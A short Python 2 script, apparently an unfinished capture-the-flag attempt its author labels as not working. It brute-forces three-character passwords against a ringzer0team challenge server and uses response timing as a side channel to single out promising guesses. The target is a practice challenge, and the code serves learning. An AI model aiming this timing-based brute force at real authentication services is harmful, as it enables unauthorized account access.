import itertools
import socket

"""
DOESN'T WORK
"""

def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(3, maxlength + 1)))

def netcat(hostname, port, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))
    s.sendall(content)
    s.shutdown(socket.SHUT_WR)
    while 1:
        data = s.recv(1024)
        if data == "":
            break
        print "Received:", repr(data)
    print "Connection closed."
    s.close()


if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("ringzer0team.com",60000))
    s.sendall("0")
    data = s.recv(9999)
    for password in bruteforce('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',3):
        #print password
        s.sendall("03e" + password + "00000000000")
        data = s.recv(9999)
        print data
        if float(data.split()[4]) > 0.000030:
            print password


        #print data
        if not "Wrong" in data:
            print data
            s.close()
            break
